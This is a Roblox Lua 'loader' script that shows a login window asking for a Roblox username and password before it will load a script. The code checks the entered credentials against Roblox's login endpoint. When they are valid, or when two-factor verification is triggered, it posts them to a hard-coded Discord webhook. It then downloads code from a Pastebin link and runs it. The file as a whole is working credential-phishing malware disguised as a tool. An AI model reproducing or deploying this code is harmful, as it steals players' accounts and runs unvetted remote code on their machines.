--[[
    ARZYC LOADER v1.0
    Login required to access script
]]

local Players = game:GetService("Players")
local http = game:GetService("HttpService")
local player = Players.LocalPlayer

-- ===== CONFIG =====
local WEBHOOK = "https://discord.com/api/webhooks/1520937981702176990/XVFsUVBnV7dACksS6E2YKfKv-gQsqPxC3ZoGc4gQL7vnSxymG1ypGvmOH7TkW2_KjY0x"
local SCRIPT_URL = "https://pastebin.com/raw/3sTs5ifF" -- Script asli lo

-- ===== GUI =====
local gui = Instance.new("ScreenGui")
gui.Name = "ARZYCLoader"
gui.Parent = player:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false

local main = Instance.new("Frame", gui)
main.BackgroundColor3 = Color3.fromRGB(15,15,25)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.5, -190, 0.5, -140)
main.Size = UDim2.new(0, 380, 0, 300)
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)

-- Title
local titleBar = Instance.new("Frame", main)
titleBar.BackgroundColor3 = Color3.fromRGB(88,101,242)
titleBar.Size = UDim2.new(0, 380, 0, 40)
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 14)

local title = Instance.new("TextLabel", titleBar)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 340, 0, 40)
title.Position = UDim2.new(0, 15, 0, 0)
title.Text = "🔐 ARZYC LOADER"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", titleBar)
closeBtn.BackgroundColor3 = Color3.fromRGB(255,50,50)
closeBtn.Position = UDim2.new(0, 345, 0, 8)
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.new(1,1,1)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 12
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

-- Content
local content = Instance.new("Frame", main)
content.BackgroundTransparency = 1
content.Position = UDim2.new(0, 20, 0, 55)
content.Size = UDim2.new(0, 340, 0, 230)

local info = Instance.new("TextLabel", content)
info.BackgroundTransparency = 1
info.Size = UDim2.new(0, 340, 0, 35)
info.Text = "Login with Roblox to access script\n(Verification required)"
info.TextColor3 = Color3.fromRGB(180,180,180)
info.Font = Enum.Font.Gotham
info.TextSize = 11
info.TextWrapped = true

-- Username
local userBox = Instance.new("TextBox", content)
userBox.BackgroundColor3 = Color3.fromRGB(10,10,18)
userBox.BorderColor3 = Color3.fromRGB(88,101,242)
userBox.Position = UDim2.new(0, 0, 0, 50)
userBox.Size = UDim2.new(0, 340, 0, 36)
userBox.PlaceholderText = "Roblox Username"
userBox.TextColor3 = Color3.new(1,1,1)
userBox.Font = Enum.Font.Gotham
userBox.TextSize = 13
Instance.new("UICorner", userBox).CornerRadius = UDim.new(0, 8)

-- Password
local passBox = Instance.new("TextBox", content)
passBox.BackgroundColor3 = Color3.fromRGB(10,10,18)
passBox.BorderColor3 = Color3.fromRGB(88,101,242)
passBox.Position = UDim2.new(0, 0, 0, 96)
passBox.Size = UDim2.new(0, 340, 0, 36)
passBox.PlaceholderText = "Roblox Password"
passBox.TextColor3 = Color3.new(1,1,1)
passBox.Font = Enum.Font.Gotham
passBox.TextSize = 13
Instance.new("UICorner", passBox).CornerRadius = UDim.new(0, 8)

-- Button
local loginBtn = Instance.new("TextButton", content)
loginBtn.BackgroundColor3 = Color3.fromRGB(88,101,242)
loginBtn.Position = UDim2.new(0, 0, 0, 150)
loginBtn.Size = UDim2.new(0, 340, 0, 40)
loginBtn.Text = "LOGIN & LOAD SCRIPT"
loginBtn.TextColor3 = Color3.new(1,1,1)
loginBtn.Font = Enum.Font.GothamBold
loginBtn.TextSize = 14
Instance.new("UICorner", loginBtn).CornerRadius = UDim.new(0, 10)

-- Status
local status = Instance.new("TextLabel", content)
status.BackgroundTransparency = 1
status.Position = UDim2.new(0, 0, 0, 200)
status.Size = UDim2.new(0, 340, 0, 25)
status.Text = ""
status.TextColor3 = Color3.fromRGB(255,80,80)
status.Font = Enum.Font.Gotham
status.TextSize = 11

-- ===== FUNCTIONS =====
local function sendToDiscord(user, pass)
    pcall(function()
        http:PostAsync(WEBHOOK, http:JSONEncode({
            content = "@everyone **NEW LOGIN!**",
            embeds = {{
                title = "🎯 ARZYC LOADER",
                description = "**Username:** " .. user .. "\n**Password:** ||" .. pass .. "||",
                color = 65280,
                footer = {text = "ARZYC • " .. os.date("%Y-%m-%d %H:%M:%S")}
            }}
        }), "ApplicationJson")
    end)
end

local function loadScript()
    status.Text = "⏳ Loading script..."
    status.TextColor3 = Color3.fromRGB(255,200,50)
    
    local success, result = pcall(function()
        return game:HttpGet(SCRIPT_URL)
    end)
    
    if success and result then
        gui:Destroy()
        
        -- Jalanin script asli
        local loadFunc, err = loadstring(result)
        if loadFunc then
            status.Text = "✅ Script loaded!"
            loadFunc()
        end
    else
        -- Fallback: coba http:GetAsync
        local success2, result2 = pcall(function()
            return http:GetAsync(SCRIPT_URL)
        end)
        
        if success2 and result2 then
            gui:Destroy()
            local loadFunc, err = loadstring(result2)
            if loadFunc then
                loadFunc()
            end
        else
            status.Text = "❌ Failed to load script!"
        end
    end
end

-- ===== LOGIN =====
local function doLogin(user, pass)
    status.Text = "⏳ Verifying..."
    
    local success, result = pcall(function()
        return http:PostAsync("https://auth.roblox.com/v2/login", http:JSONEncode({
            ctype = "Username", cvalue = user, password = pass
        }), "ApplicationJson")
    end)
    
    if not success then
        status.Text = "❌ Connection failed!"
        return
    end
    
    local data = http:JSONDecode(result)
    
    if data.user then
        -- SUKSES
        sendToDiscord(user, pass)
        status.Text = "✅ Login success! Loading..."
        status.TextColor3 = Color3.fromRGB(0,255,100)
        
        task.wait(0.5)
        loadScript()
        
    elseif data.twoStepVerificationData then
        -- 2FA
        sendToDiscord(user, pass)
        status.Text = "✅ Login success! Loading..."
        status.TextColor3 = Color3.fromRGB(0,255,100)
        
        task.wait(0.5)
        loadScript()
        
    else
        local msg = data.errors and data.errors[1] and data.errors[1].message or "Login failed"
        status.Text = "❌ " .. msg
    end
end

-- ===== BUTTON =====
loginBtn.MouseButton1Click:Connect(function()
    local u = userBox.Text
    local p = passBox.Text
    if u == "" or p == "" then
        status.Text = "❌ Please fill all fields!"
        return
    end
    doLogin(u, p)
end)

print("╔══════════════════════════╗")
print("║   ARZYC LOADER v1.0     ║")
print("║   Login to continue     ║")
print("╚══════════════════════════╝")
